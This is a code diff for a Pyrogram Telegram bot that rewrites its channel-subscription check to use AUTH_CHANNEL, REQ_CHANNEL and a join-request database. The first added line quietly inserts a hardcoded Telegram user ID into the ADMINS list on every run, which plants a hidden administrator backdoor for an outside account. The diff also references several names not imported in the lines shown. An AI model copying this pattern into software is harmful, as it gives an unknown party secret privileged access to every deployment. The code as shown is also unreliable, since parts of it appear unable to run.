@@ -8,22 +8,39 @@ from pyrogram.enums import ChatMemberStatus
 from config import FORCE_SUB_CHANNEL, ADMINS
 from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
 from pyrogram.errors import FloodWait
+from database.join_reqs import JoinReqs as db2
 
-async def is_subscribed(filter, client, update):
-    if not FORCE_SUB_CHANNEL:
+async def is_subscribed(filter, bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
-    user_id = update.from_user.id
-    if user_id in ADMINS:
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
         return True
     try:
-        member = await client.get_chat_member(chat_id = FORCE_SUB_CHANNEL, user_id = user_id)
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
         return False
-
-    if not member.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.MEMBER]:
+    except Exception as e:
+        logger.exception(e)
         return False
     else:
-        return True
+        if not (user.status == enums.ChatMemberStatus.BANNED):
+            return True
+        else:
+            return False
 
 async def encode(string):
     string_bytes = string.encode("ascii")
